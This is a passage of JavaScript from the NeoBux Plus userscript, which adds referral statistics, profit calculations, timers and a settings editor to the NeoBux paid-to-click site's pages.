        getField: function (key) {
            for (var tabName in Config.settings) {
                if (typeof Config.settings[tabName].fields === "object") {
                    var fields = Config.settings[tabName].fields;
                    for (var fieldName in fields) {
                        if (fieldName === key) {
                            return fields[fieldName];
                        }
                    }
                }
            }
            return false;
        },
        get: function (key) {
            var field = Config.getField(key);
            key = typeof Config.prefix === "string" ? Config.prefix + key : key;
            switch (field.type) {
            case "checkbox":
            if (typeof field.value === "undefined" || !field.value) {
                    return (typeof GM.getValue(key) !== "undefined" && GM.getValue(key) === "true") ? true : false; // false by default
                } else {
                    return (typeof GM.getValue(key) !== "undefined" && GM.getValue(key) === "false") ? false : true; // true by default
                }
                break;
            case "select":
            case "password": 
            case "text":
                return typeof GM.getValue(key) === "undefined" ? (typeof field.value !== "undefined" ?  field.value : "") : GM.getValue(key);
            default:
                return typeof GM.getValue(key) === "undefined" ? "" : GM.getValue(key);
            }
        },
        set: function (key, value) {
            key = typeof Config.prefix === "string" ? Config.prefix + key : key;
            GM.setValue(key, value.toString());
        },
        $: function (id) {
            return document.getElementById(id);
        }
    };

    function insertLogo() {
        var
            arrowImg,
            img,
            lastColumn,
            row,
            script,
            td;
        row = selectNode("//div[@class='mbxm sb'][1]/../..");
        lastColumn = selectNode("//div[@class='mbxm sb'][1]/..");
        td = document.createElement("td");
        row.insertBefore(td, lastColumn);
        img = document.createElement("img");
        img.id = "neobuxplus";
        img.src = "data: image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAFo9M/3AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABDdJREFUeNpiEGZnYFhSn7GHYUZZ+mMWBob/AAHEoC3Kx1AQHczAeO3q5f/KRw8zAAQQo7WmCoOKqtx/aTl1IC3LwPSHU4AhQF+RQfjkYQb+T5cZAAIARAC7/wMWFxoALhYHHggND/EA//4AAI5jRf8AAgT/HRwZ/5WAabACE/P3AOu4tACsqqoA5tnZTwQyTkzzh2tqDRYdHADkEQpVAgCEAHv/AQ8HAACDY1KqDwD6IvwSFTPb6u0AHBIiuBwQBv1mhpZMAE9HPhGqf2768eXj/92wsP8nGBb/5eDg/+iZlv9mXVNUBO719QsGDwkEOi8sAB8jEwDb9fQAWTMxAB1HPgAvHSI/ARAEAAA0NjMAQEBDMy0I+cbW6+IG6PAFbPv8/K2iqsLoAgAIAff+AxUMBwAMAQUABAD8AJR4aKwOFhDb+e3w6DU4NgDz8fAABPr8/AG1elL+zewGzNnm3jRMMChTIQkJmBAaHQvQzc9eApmAdcuw1OMAlrjGNPL9FABZf5cA4PT5aCUmGF0kJhsAAsHZ4ZJXIDcAtbO4AOHNygC5h4MAiZKaAPza5Pzf6usJAgnv5aEnAQQA2+HeANrc4wAQBgMA2+PiAAbl3gSRcXK1AKWOgsduaFv/MwwI/4tbPv8AAwf/PxAL/5+GducoJB4MA/n+BMGIPhduCv0PANzg5AA9BgkAQ2VSAEM/PQyptLd7AQ0AAABcYVkfDAcDOxkL+6UfChb+o8LJIcfS4eL49QAAAlRIN69JxgEcwL8/Xx81p4aK783p2MjVyHSDpjI65daKOgQjCnoZFR1i0KFTLyB1GfQfDDoIBb2ti6uNDSsaY7YHZblMUbdSdKmZOR+d2pPdP8cP+b+CJRyYjN1qHSW0J39svaP2K/W3vCMrNUFTv8djYRTr6rNLn0fD6/TqmZMnEMsXSSgUYgUCPohKIcPEqOPSmJk/u5JIw2y2IlenEN3agb2nD8IOCsU3Yew4t6MXZocbrUIRd+75RjbiqU/cg/0WuIYc1ymp1LEvXek0E0CmNGI7mQEdj4HejIIp1+C2DoD/vYTM3GtEdrOQHLAxkWwuwLl61pvgtSrXarEULt+fQbCnF9P+Z/DPB6D+S1DJFhB48RJPE9/waOMLLrwKwNQSQ1TL3fBdufiWPJw6/0DD/r67s9eAmt6GYmgYVbEUa8F5RFsMlmN5mEFwc/IcLHIF8sFFwH0Y0i4R6LJgmjidgzCoDZLj9v7HHGFrKvx8AZO7dSxqRVCpJGhEfgKUEJ46gzlKAvn4MSh5vIWZJ29OFytFhtss/0IymW7bLFrDeJ/K5TnlpVIDNrbE45AkoZDXKwGrHk3vGHtosLsmaVT/0Pm2PxT++p7ii1mi4APtNuByD0Mml0OvMyG4FoTnqPOISSa5LRKJuzLVhm9p+cOqkLSh0WjxcT2BUoEBl8vBP2Iqng+e/R48AAAAAElFTkSuQmCC";
        img.width = "16";
        img.height = "16";
        img.border = "0";
        img.style.cursor = "pointer";
        img.alt = "NeoBux Plus Greasemonkey Script Preferences";
        img.addEventListener("click", function() { showSettingsEditor(); }, false);
        td.appendChild(img);
        script = document.createElement("script");
        script.textContent = "mk_tt('neobuxplus', 'bottom', 'NeoBux Plus<br/>Options');";
        row.insertBefore(script, lastColumn);
        if (toBool(manipulatePrefs("firstRun", true, "get"))) {
// Code to run when the user first installs the script.
// Add the arrow pointing to the settings editor.
            arrowImg = document.createElement("img");
            arrowImg.src = "data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAQCAYAAAGthlVmAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAcpJREFUeNpiuCXPw8B0+scfBoAAYrguyyXFdPXX/6cAAcSwQ4a3e0tM8H+GTmF2hqMyXP8BAojxpgynACMz8wemW3Ye7+/+Y+pjXCPO+f8nw39GJklWRoYnf/4zAAQQ43kpDoY38dn/GdnYGIRn9zOyPP3PyPBj1xYGBkYgDWSzPAYqU3z+mIGRgYHhHpDN9PTPPwZZFkYwfgJkAwQQI8g1z7n5V0l9/RjG9JyBKY+9qCb0KTNbBct7IfFYjtMnGH4IigQzMbx40vLt6kUGhqdPWpm+/fvP8O/2TYZv//8xMH3/x8DAz8zIAKKZvv3/z8DHxMDwHUgzfQdiISagDJAGCNAB2fMQEIRBePZ2jxMkVCjoFBKJRilRXmj8OoXSP1D5aOTUOh+JkCgVhMgdTriz5q7YbDLzPrvvDNaVNLZFE4tmdegM+tppNUabgox14ZQs223b00ytDv32IawUnocdMvNxT2mImZqPO/fLeWLmcvi6LqzVsgvDmKgrf9VCJfVxj0AqIAzxhEy+qCuXW0gmz/uvuAHNc6cW8FYeQySolqURDxHAKfyxt4ikmWaJWa5v0oiIKOCDNE1OC3z8UN8CvvCl6f3w8Uj+AesHuQv9i+2ZAAAAAElFTkSuQmCC";
            arrowImg.setAttribute("style", "position: relative; right: 12px; top: 20px;");
            td.appendChild(arrowImg);
        } else {
            td = document.createElement("td");
            td.innerHTML = "&nbsp;";
            row.insertBefore(td, lastColumn);
        }
    }

    function insertScriptVersion() {
        var
            cell,
            span;
        cell = selectNode("//body/div[1]/div[1]/table[1]/tbody/tr[2]/td[2]");
        span = document.createElement("span");
        span.setAttribute("style", "font-size: 9px !important;");
        span.innerHTML =
                "<a class='cinza' style='font-size: 9px;' " +
                "href='http://userscripts.org/scripts/show/78129'>" +
                "<span style='color: #000000'>NeoBux Plus</span> " + version +
                "</a>&nbsp;&nbsp;&nbsp;&nbsp;";
        cell.appendChild(span);
    }

    function firstRun() {
// Code to run when the user first installs the script.
        alert("NeoBux Plus:\nThank you for installing the NeoBux Plus script for Greasemonkey.");
        alert("NeoBux Plus:\nYou will now be asked three (3) questions to help get the script running as quickly as possible.\n\nIf you wish to change any of your answers later, or want to edit any of the other settings, click on the logo in the top-right of your screen next to the Referral statistics icon (indicated by the red arrow that will disappear after you leave this page).\n\n");
        var renewalLength = prompt("NeoBux Plus:\nHow many days you renew your referrals for usually?\nNOTE: Enter number only.\n1 (AutoPay) or 15 or 30 or 60 or 90 or 150 or 240.");
        if (renewalLength) {
            renewalLength = parseInt(renewalLength, 10);
            if (renewalLength === 1 ||
                    renewalLength === 15 || renewalLength === 30 ||
                    renewalLength === 60 || renewalLength === 90 ||
                    renewalLength === 150 || renewalLength === 240) {
                manipulatePrefs("renewalPeriod", renewalLength.toString(), "set");
            } else {
                alert("NeoBux Plus Error:\nThe value that you entered is not valid. The value has defaulted to 240 day renewals. If you wish to edit this value, use the settings editor.");
            }
        }
        var rentedRefs = prompt("NeoBux Plus:\nHow many **RENTED** referrals do you have?\nIf you click cancel, the script will automatically detect this value the next time you visit your rented referrals page.");
        if (rentedRefs && !isNaN(rentedRefs)) {
            manipulatePrefs("numberOfRentedRefs", rentedRefs, "set");
        }
        var directRefs = prompt("NeoBux Plus:\nHow many **DIRECT** referrals do you have?\nIf you click cancel, the script will automatically detect this value the next time you visit your direct referrals page.");
        if (directRefs && !isNaN(directRefs)) {
            manipulatePrefs("numberOfDirectRefs", directRefs, "set");
        }
// Inform the script that the initial setup is complete.
        manipulatePrefs("firstRun", false.toString(), "set"); 
    }

// DEFINE Classes used by the Script
    var currentPage = new function () {
// Information about the page currently being viewed:
        this.URL = document.location.href;
        this.name = getCurrentPage("location");
        this.language = getCurrentPage("language");
    };

// Store how large the graphs are expected to be
// Recent changes to graphs mean that those that show
// click data are only 10-days long
    var graphSettings = new function (getSet) {
        if (!getSet) {
            getSet = "get";
        }
        this.refGraphLength = Number(manipulatePrefs("refGraphLength", 10, getSet));
        this.regularGraphLength = Number(manipulatePrefs("regularGraphLength", 15, getSet));
    };

// Information about the users account
    var myAccount = new function () {
        this.name = document.getElementById("t_conta").textContent;
        this.rentedRefCount = getNumberOfRefs("Rented");
        this.directRefCount = getNumberOfRefs("Direct");
        this.getTotalRefCount = this.rentedRefCount + this.directRefCount;
        this.accountType = getAccountType(false);
        this.autopayLimit = getAutoPayLimit(this.accountType);
        this.autopayCost = getAutoPayCost(this.accountType);
        this.recycleCost = getRecycleCost(this.accountType);
        this.renewalFee = function (renewalPeriod) { return getRenewalFees(renewalPeriod); };
        this.goldenPackCost = getGoldenPackCost(this.accountType);
        this.ownClickValue = getOwnClickValue(this.accountType);
        this.directReferralClickValue = getDirectReferralClickValue(this.accountType);
        this.rentedReferralClickValue = getRentedReferralClickValue(this.accountType);
// This will later be used to get & store a local copy of user statistics.
// this.avgSpentOnRecycles = the average amount spent on recycling each day
        this.stats = new function (getSet) {
            if (!getSet) {
                getSet = "get";
            }
// TODO: Fetch this value automatically
            this.avgSpentOnRecycles = 2.608;
        };
// Get user preferences
        this.preferences = new function (getSet) {
            if (!getSet) {
                getSet = "get";
            }
// Script Settings
            this.updateFrequency = Number(manipulatePrefs("updateFrequency", 86400000, getSet));
            this.updateLastCheck = Number(manipulatePrefs("updateLastCheck", 0, getSet));
// Referral Counts
            this.overrideRentedReferralCount = toBool(manipulatePrefs("overrideRentedReferralCount", false, getSet));
            this.manualRentedReferralCount = Number(manipulatePrefs("manualRentedReferralCount", 0, getSet));
            this.overrideDirectReferralCount = toBool(manipulatePrefs("overrideDirectReferralCount", false, getSet));
            this.manualDirectReferralCount = Number(manipulatePrefs("manualDirectReferralCount", 0, getSet));
// Decimal Precision
            this.decimalPrecision = Number(manipulatePrefs("decimalPrecision", 4, getSet));
            this.nanString = "-." + new Array(this.decimalPrecision + 1).join("-");
// Flags
            this.textifyFlag = toBool(manipulatePrefs("textifyFlag", false, getSet));
            this.textifyFlag_prefix = manipulatePrefs("textifyFlag_prefix", " | ", getSet);
// Account Settings
            this.renewalPeriod = Number(manipulatePrefs("renewalPeriod", 240, getSet)); // 1 (AutoPay) | 15 days | 30 days | 60 days | 90 days | 150 days | 240 days
// Shrinking the contents of the columns
            this.letterSpacing = manipulatePrefs("letterSpacing", "0.0px", getSet);
            this.wordSpacing = manipulatePrefs("wordSpacing", "0.0px", getSet);
// Referral Number column
            this.referralNumber_shrinkContents = toBool(manipulatePrefs("referralNumber_shrinkContents", true, getSet));
// Flag column
            this.flag_shrinkContents = toBool(manipulatePrefs("flag_shrinkContents", true, getSet));
// Referral Name column
            this.referralName_shrinkContents = toBool(manipulatePrefs("referralName_shrinkContents", true, getSet));
// Came From column
            this.cameFrom_shrinkContents = toBool(manipulatePrefs("cameFrom_shrinkContents", true, getSet));
// Owned Since column:
            this.referralSince_numerise = toBool(manipulatePrefs("referralSince_numerise", true, getSet));
            this.referralSince_fullerTimers = toBool(manipulatePrefs("referralSince_fullerTimers", true, getSet));
            this.ownedSinceTimer_shortFormat = toBool(manipulatePrefs("ownedSinceTimer_shortFormat", true, getSet));
            this.referralSince_replace = toBool(manipulatePrefs("referralSince_replace", false, getSet));
            this.ownedSince_shrinkContents = toBool(manipulatePrefs("ownedSince_shrinkContents", true, getSet));
// Next Payment column
            this.nextPayment_shrinkContents = toBool(manipulatePrefs("nextPayment_shrinkContents", true, getSet));
// Last Click column:
            this.lastClick_numerise = toBool(manipulatePrefs("lastClick_numerise", true, getSet));
            this.lastClick_fullerTimers = toBool(manipulatePrefs("lastClick_fullerTimers", true, getSet));
            this.lastClickTimer_shortFormat = toBool(manipulatePrefs("lastClickTimer_shortFormat", true, getSet));
            this.lastClick_replace = toBool(manipulatePrefs("lastClick_replace", false, getSet));
            this.lastClick_replaceNilClicks = toBool(manipulatePrefs("lastClick_replaceNilClicks", false, getSet));
            this.lastClick_shrinkContents = toBool(manipulatePrefs("lastClick_shrinkContents", true, getSet));
// Total Clicks column
            this.totalClicks_shrinkContents = toBool(manipulatePrefs("totalClicks_shrinkContents", true, getSet));
// Average column
            this.exactAverage_show = toBool(manipulatePrefs("exactAverage_show", true, getSet));
            this.exactAverage_seperator = manipulatePrefs("exactAverage_seperator", " | ", getSet);
            this.exactAverage_replace = toBool(manipulatePrefs("exactAverage_replace", false, getSet));
            this.columnPrefix_Average = manipulatePrefs("columnPrefix_Average", "", getSet);
            this.average_shrinkContents = toBool(manipulatePrefs("average_shrinkContents", true, getSet));
// Profit Column
            this.showColumn_Profit = toBool(manipulatePrefs("showColumn_Profit", true, getSet));
            this.includeRecycleCostInProfitColumn = toBool(manipulatePrefs("includeRecycleCostInProfitColumn", true, getSet));
            this.columnPrefix_Profit = manipulatePrefs("columnPrefix_Profit", "$", getSet);
            this.profitColumn_shrinkContents = toBool(manipulatePrefs("profitColumn_shrinkContents", true, getSet));
// Time Periods for 'smaller' 10day graphs
            this.timePeriod_s1 = Number(manipulatePrefs("timePeriod_s1", 5, getSet));
            this.timePeriod_s2 = Number(manipulatePrefs("timePeriod_s2", 7, getSet));
            this.timePeriod_s3 = Number(manipulatePrefs("timePeriod_s3", graphSettings.refGraphLength, getSet));
// Time Periods for 'larger' 15day graphs
            this.timePeriod_1 = Number(manipulatePrefs("timePeriod_1", 5, getSet));
            this.timePeriod_2 = Number(manipulatePrefs("timePeriod_2", 10, getSet));
            this.timePeriod_3 = Number(manipulatePrefs("timePeriod_3", graphSettings.regularGraphLength, getSet));
// Time Period for 'recent' section of the Referral statistics sidebar
            this.timePeriod_recent = Number(manipulatePrefs("timePeriod_recent", 10, getSet));
        };
// Get Preferences for Ultimate-Only Features
        this.ultimatePreferences = new function (getSet) {
            if (!getSet) {
                getSet = "get";
            }
// Time Period for the 'average1' column (previously the A10 column)
            this.timePeriod_average1 = Number(manipulatePrefs("timePeriod_average1", 10, getSet));
// Time Period for the 'average2' column (previously the A7 column)
            this.timePeriod_average2 = Number(manipulatePrefs("timePeriod_average2", 7, getSet));
// Show Minigraph Average Footer
            this.showRecentAverage = toBool(manipulatePrefs("showRecentAverage", true, getSet));
            this.RA_shrinkContents = toBool(manipulatePrefs("RA_shrinkContents", true, getSet));
// Time Period for Minigraph Average
            this.minigraphAvgInterval = Number(manipulatePrefs("minigraphAvgInterval", 10, getSet));
// 'clickText' column
            this.showColumn_clickText = toBool(manipulatePrefs("showColumn_clickText", true, getSet));
            this.columnPrefix_clickText = manipulatePrefs("columnPrefix_clickText", "", getSet);    
            this.clickText_shrinkContents = toBool(manipulatePrefs("clickText_shrinkContents", true, getSet));
// 'average1' column (previously the A10 column)
            this.showColumn_Average1 = toBool(manipulatePrefs("showColumn_Average1", true, getSet));
            this.columnPrefix_Average1 = manipulatePrefs("columnPrefix_Average1", "", getSet);
            this.average1_shrinkContents = toBool(manipulatePrefs("average1_shrinkContents", true, getSet));
// 'average2' column (previously the A7 column)
            this.showColumn_Average2 = toBool(manipulatePrefs("showColumn_Average2", true, getSet));
            this.columnPrefix_Average2 = manipulatePrefs("columnPrefix_Average2", "", getSet);
            this.average2_shrinkContents = toBool(manipulatePrefs("average2_shrinkContents", true, getSet));
// Standard Deviation (SDEV / SD) Column
            this.showSDEVColumn = toBool(manipulatePrefs("showSDEVColumn", true, getSet));
            this.columnPrefix_SD = manipulatePrefs("columnPrefix_SD", "", getSet);
            this.SD_shrinkContents = toBool(manipulatePrefs("SD_shrinkContents", true, getSet));
// Ratio of Standard deviation and Average (RSA) Column
            this.showColumn_RSA = toBool(manipulatePrefs("showColumn_RSA", true, getSet));
            this.columnPrefix_RSA = manipulatePrefs("columnPrefix_RSA", "", getSet);
            this.RSA_shrinkContents = toBool(manipulatePrefs("RSA_shrinkContents", true, getSet));
        }
    };

    var numberOfRentedReferrals;
    var numberOfDirectReferrals;
    if (myAccount.preferences.overrideRentedReferralCount) {
        numberOfRentedReferrals = myAccount.preferences.manualRentedReferralCount;
    } else {
        numberOfRentedReferrals = myAccount.rentedRefCount;
    }
    if (myAccount.preferences.overrideDirectReferralCount) {
        numberOfDirectReferrals = myAccount.preferences.manualDirectReferralCount;
    } else {
        numberOfDirectReferrals = myAccount.directRefCount;
    }

// mathematical function.. calc num^2
    Math.square = function (num) {
      return num * num;
    };

// Functions used by script
    function getDaysTillPaidOwnRecycle(indivAvg, currentProfit, expensesPerRefPerDay) {
        var incomePerRefPerDay = indivAvg * myAccount.rentedReferralClickValue;
        var dayCounter = 0;
        var indivProfit = [];
        var dayLimit = 30;
        var profitNeeded = myAccount.recycleCost - currentProfit;
// Pre-Calculate the amount of profit that will be made after dayCounter days at indivAvg clicks per day
        do {
            dayCounter += 1;
            indivProfit[dayCounter] = dayCounter * (incomePerRefPerDay - expensesPerRefPerDay);
        } while (dayCounter < dayLimit);
// If currentProfit is less than the cost of recycling, return number of days until currentProfit > recycleCost
// Else return 'N/A' to signify that the referral has already generated enough profit to pay for its own recycle
        if (myAccount.recycleCost > currentProfit) {
// Find the point where projected individual profit will be equal to or greater than
// the amount of profit needed to pay for its own recycle
            var numberOfDays = 1;
            while (indivProfit[numberOfDays] < profitNeeded) {
                numberOfDays += 1;
            }
// Check whether the numberOfDays is unreasonably large
// If it is unreasonably large (default max: 30 days), then return a message saying this
            if (numberOfDays > dayLimit) {
                numberOfDays = "More than " + dayLimit + " days";
            }
            return numberOfDays;
        } else {
            return "N/A";
        }
    }

// Calculate the number of days since the date 'tmp'
// Will work with the words 'today' & 'yesterday' too
    function NumDaysSince(longDate, detail, fullerTimer, shortFormat) {
        var
            dateDiff,
            dateParts,
            day_text,
            days_text,
            hr_text,
            hrs_text,
            min_text,
            mins_text,
            Since,
            spacer,
            timeElapsed,
            tt,
            wholeDaysOwned,
            wholeHoursOwned,
            wholeMinsOwned;
        if (!shortFormat) {
            shortFormat = false;
        }
// Split the input string to [0] = date, [1] = time
        dateParts = longDate.split(" ");
// If longDate is a date with time (eg, 'owned since' column), dateParts[1] === time
// If longDate is just a date (eg, 'last click' column), dateParts.length === 1
        if (dateParts[dateParts.length - 1].indexOf(":") > -1) {
            dateParts = [dateParts[0], dateParts[dateParts.length - 1]];
        } else {
            dateParts = [dateParts[0], "00:00"];
        }
        tt = dateParts[1].split(":");
        if (longDate.indexOf("/") > -1 ||
                longDate.indexOf(neobuxString("today")) > -1 ||
                longDate.indexOf(neobuxString("yesterday")) > -1) {
            if (longDate.match(neobuxString("today"))) {
                Since = new Date(Today.getFullYear(),
                        Today.getMonth(), Today.getDate(), 0, 0);
            } else if (longDate.match(neobuxString("yesterday"))) {
                Since = new Date(Yesterday.getFullYear(),
                        Yesterday.getMonth(), Yesterday.getDate(), 0, 0);
            } else {
                Since = new Date(dateParts[0] + " " + dateParts[1]);
            }
            dateDiff = (Today - Since) / 86400000;
            wholeDaysOwned = Math.floor(dateDiff);
            wholeHoursOwned = Math.floor((dateDiff - wholeDaysOwned) * 24);
            wholeMinsOwned = Math.floor((((dateDiff - wholeDaysOwned) * 24) -
                    wholeHoursOwned) * 60);
        } else {
            if (tt[0].indexOf("-") > -1) {
                tt[0] = tt[0].replace("-", "");
                wholeDaysOwned = dateParts[0] - 1;
                wholeHoursOwned = 24 - tt[0];
                wholeMinsOwned = tt[1];
            } else {
                wholeDaysOwned = dateParts[0];
                wholeHoursOwned = tt[0];
                wholeMinsOwned = tt[1];
            }
            dateDiff = wholeDaysOwned / 1 +
                    wholeHoursOwned / 24 +
                    wholeMinsOwned / 1440;
        }
        timeElapsed = "";
        if (fullerTimer ||
                detail === "decimal") {
            if (detail === "decimal") {
                timeElapsed = dateDiff;
            } else if (detail !== "days" &&
                    detail !== "hrs" &&
                    detail !== "mins" &&
                    detail !== "wholeDays" &&
                    detail !== "decimal") {
                GM.log("Variable 'detail' not valid");
            } else {
                if (!shortFormat) {
                    day_text = " day";
                    days_text = " days";
                    hr_text = " hr";
                    hrs_text = " hrs";
                    min_text = " min";
                    mins_text = " mins";
                } else {
                    day_text = "d";
                    days_text = "d";
                    hr_text = "h";
                    hrs_text = "h";
                    min_text = "m";
                    mins_text = "m";
                }
                spacer = ", ";
// Chrome bug: ""timeElapsed  +="" must be used repeatedly, else will append values in the wrong order
// eg, (d0, 2h, 48m) instead of (0d, 2h, 48m)
                if (detail === "days" ||
                        detail === "hrs" ||
                        detail === "mins") {
                    if (wholeDaysOwned !== 1) {
                        timeElapsed += wholeDaysOwned;
                        timeElapsed += days_text;
                    } else {
                        timeElapsed += wholeDaysOwned;
                        timeElapsed += day_text;
                    }
                }
                if (detail === "hrs" ||
                        detail === "mins") {
                    if (wholeHoursOwned !== 1) {
                        timeElapsed += spacer;
                        timeElapsed += wholeHoursOwned;
                        timeElapsed += hrs_text;
                    } else {
                        timeElapsed += spacer;
                        timeElapsed += wholeHoursOwned;
                        timeElapsed += hr_text;
                    }
                }
                if (detail === "mins") {
                    if (wholeMinsOwned !== 1) {
                        timeElapsed += spacer;
                        timeElapsed += wholeMinsOwned;
                        timeElapsed += mins_text;
                    } else {
                        timeElapsed += spacer;
                        timeElapsed += wholeMinsOwned;
                        timeElapsed += min_text;
                    }
                }
            }
        }
        if ((!fullerTimer ||
                detail === "wholeDays") &&
                detail !== "decimal") {
            timeElapsed = Math.floor(dateDiff);
        }
        return timeElapsed;
    }

    function showSettingsEditor() {
        Config.show(null);
    }

    function localString(key, text) {
        var string;
        var language = currentPage.language;
        if ("undefined" !== typeof scriptLangStrings[language]) {
            string = scriptLangStrings[language][key];
        } else if ("undefined" !== typeof scriptLangStrings["US"]) {
            string = scriptLangStrings["US"][key];
        } else {
            return key;
        }
        if (text) {
            string = string.replace("%s", text);
        }
        return string;
    }

    function neobuxString(key) {
        var pageLanguage = currentPage.language;
        if ("undefined" !== typeof neobuxLangStrings[pageLanguage]) {
            return neobuxLangStrings[pageLanguage][key];
        } else if ("undefined" !== typeof neobuxLangStrings["US"]) {
            return neobuxLangStrings["US"][key];
        } else {
            return key;
        }
    }

// Object that will hold the data about the current graph
    function graphProperties(values, totals) {
        this.value = new function () {
            var i = 1;
            var tmp = [0];
            do {
                tmp[i] = values[i - 1];
                if (isNaN(tmp[i]) || !isFinite(tmp[i])) {
                    tmp[i] = -1;
                }
            } while (i++ < values.length);
            return tmp;
        };
        this.totals = new function () {
            var i = 1;
            var tmp = [0];
            do {
                tmp[i] = tmp[i - 1] + parseFloat(values[i - 1]);
                if (isNaN(tmp[i]) || !isFinite(tmp[i])) {
                    tmp[i] = -1;
                }
            } while (i++ < values.length);
            return tmp;
        };
        this.today = values[0];
        this.yesterday = values[1];
        this.recent = totals[myAccount.preferences.timePeriod_recent - 1];
        this.mean = new function () {
            var i = 1;
            var tmp = [0];
            do {
                tmp[i] = totals[i - 1] / i;
                if (isNaN(tmp[i]) || !isFinite(tmp[i])) {
                    tmp[i] = -1;
                }
                customLogger("i = " + i + "\n" +
                        "totals[i] = " + totals[i] + "\n" +
                        "totals[i - 1] = " + totals[i - 1] + "\n" +
                        "totals[i - 2] = " + totals[i - 2] + "\n" +
                        "tmp[i] = " + tmp[i], 12);
            } while (i++ < totals.length);
            return tmp;
        };
        this.variance = new Stats(values).variance;
        this.sdev = new Stats(values).sdev;
        customLogger("values = " + values + "\n" +
                "totals = " + totals + "\n" +
                "this.today = " + this.today + "\n" +
                "this.yesterday = " + this.yesterday + "\n" +
                "this.value = " + this.value + "\n" +
                "this.totals = " + this.totals + "\n" +
                "this.mean = " + this.mean + "\n" +
                "this.variance = " + this.variance + "\n" +
                "this.sdev = " + this.sdev + "\n" +
                "totals.length = " + totals.length + "\n" +
                "this.value.length = " + this.value.length, [7, 10, 12]);
    }

    var Today = new Date();
    var Yesterday = new Date();
    Yesterday.setDate(Today.getDate() - 1);

    var today = new function () {};
    var yesterday = new function () {};
    var recent = new function () {};

// Make spaces etc appear properly without needing to use &nbsp;

// SETTINGS EDITING / CONFIG
    Config.scriptName = "NeoBux Plus";
    Config.tabs = {
        "Account Details": {
            html: "<p>This page is purely for informational purposes only to display what the script believes about your account. These are not settings that can be altered.</p>",
            fields: {
                html: {
                    type: "html",
                    html: "<table style='border-collapse: collapse;'>" +
                            "<tr><td>Your Username: </td><td style='font-weight: bold !important;'>" + myAccount.name + "</td></tr>" +
                            "<tr><td>Your Account Type: </td><td style='font-weight: bold !important;'>" + getAccountType(true) + "</td></tr>" +
                            "<tr><td>NeoBux Language: </td><td style='font-weight: bold !important;'>" + {
                                "US": "English",
                                "PT": "Portuguese",
                                "ES": "Spanish",
                                "GR": "Greek",
                                "ID": "Indonesian",
                                "FI": "Finnish",
                                "SE": "Swedish",
                                "DE": "German",
                                "FR": "French"
                            }[currentPage.language] + "</td></tr>" +
                            "<tr><td colspan='2' style='border: 0px none; height: 15px;'></td></tr>" +
                            "<tr><td># of rented referrals: </td><td style='font-weight: bold !important;'>" + myAccount.rentedRefCount + "</td></tr>" +
                            "<tr><td># of direct referrals: </td><td style='font-weight: bold !important;'>" + myAccount.directRefCount + "</td></tr>" +
                            "<tr><td>Total # of referrals: </td><td style='font-weight: bold !important;'>" + myAccount.getTotalRefCount + "</td></tr>" +
                            "<tr><td colspan='2' style='border: 0px none; height: 15px;'></td></tr>" +
                            "<tr><td>Your AutoPay Limit (days): </td><td style='font-weight: bold !important;'>" + myAccount.autopayLimit + "</td></tr>" +
                            "<tr><td>Your AutoPay Cost: </td><td style='font-weight: bold !important;'>$" + myAccount.autopayCost + "</td></tr>" +
                            "<tr><td>Your Recycle Cost: </td><td style='font-weight: bold !important;'>$" + myAccount.recycleCost + "</td></tr>" +
                            "<tr><td colspan='2' style='border: 0px none; height: 15px;'></td></tr>" + 
                            "<tr><td>The value of your clicks: </td><td style='font-weight: bold !important;'>$" + myAccount.ownClickValue + "</td></tr>" +
                            "<tr><td>The value of your rented referrals' clicks: </td><td style='font-weight: bold !important;'>$" + myAccount.rentedReferralClickValue + "</td></tr>" +
                            "<tr><td>The value of your direct referrals' clicks: </td><td style='font-weight: bold !important;'>$" + myAccount.directReferralClickValue + "</td></tr>" +
                            "<tr><td colspan='2' style='border: 0px none; height: 15px;'></td></tr>" +
                            "</table>"
                }
            }
        },
        "Account Settings": {
            html: "<p>These settings are related to how you choose to manage your account and what the script has stored regarding your account.</p>",
            fields: {
                renewalPeriod: {
                    type: "select",
                    label: "Renewal Period",
                    options: {
                        "AutoPay": "1",
                        "15": "15",
                        "30": "30",
                        "60": "60",
                        "90": "90",
                        "150": "150",
                        "240": "240"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>The number of days that you renew for.<br/>Recommended: 240 day renewals, AutoPay off.<br/>AutoPay, 15 days, 30 days, 60 days, 90 days, 150 days, 240 days</span>",
                    value: myAccount.preferences.renewalPeriod
                },
                spacer_1: {
                    type: "spacer",
                    height: "15px"
                },
                overrideRentedReferralCount: {
                    type: "checkbox",
                    label: "Override",
                    text: "<span style='font-size: x-small; font-style: italic;'>Do you want to override how many Rented referrals the script thinks that you have?</span>",
                    value: myAccount.preferences.overrideRentedReferralCount
                },
                manualRentedReferralCount: {
                    type: "text",
                    label: "Rented Refs",
                    text: "<span style='font-size: x-small; font-style: italic;'>How many rented referrals you have.</span>",
                    value: myAccount.preferences.manualRentedReferralCount
                },
                spacer_2: {
                    type: "spacer",
                    height: "15px"
                },
                overrideDirectReferralCount: {
                    type: "checkbox",
                    label: "Override",
                    text: "<span style='font-size: x-small; font-style: italic;'>Do you want to override how many Direct referrals the script thinks that you have?</span>",
                    value: myAccount.preferences.overrideDirectReferralCount
                },
                manualDirectReferralCount: {
                    type: "text",
                    label: "Direct Refs",
                    text: "<span style='font-size: x-small; font-style: italic;'>How many direct referrals you have.</span>",
                    value: myAccount.preferences.manualDirectReferralCount
                },
                spacer_3: {
                    type: "spacer",
                    height: "15px"
                },
                decimalPrecision: {
                    type: "select",
                    label: "Decimal Precision",
                    options: {
                        "0.01": "2",
                        "0.001": "3",
                        "0.0001": "4"
                    },
                    text: "<span style='font-size: x-small; font-style: italic;'>The number of digits following the point.<br/>Default: 0.0001</span>",
                    value: myAccount.preferences.decimalPrecision
                }
            }
        },
        "Referral Listings": {
            html: "<p>These settings are used to control what happens on the referral listings pages.</p>",
            fields: {
                header_Spacing: {
                    type: "html",
                    html: "<p><b>Shrinking the contents of the columns:</b></p>"
                },
                letterSpacing: {
                    type: "select",
                    label: "Letter Spacing",
                    options: {
                        "-1.0px": "-1.0px",
                        "-0.9px": "-0.9px",
                        "-0.8px": "-0.8px",
                        "-0.7px": "-0.7px",
                        "-0.6px": "-0.6px",
                        "-0.5px": "-0.5px",
                        "-0.4px": "-0.4px",
                        "-0.3px": "-0.3px",
                        "-0.2px": "-0.2px",
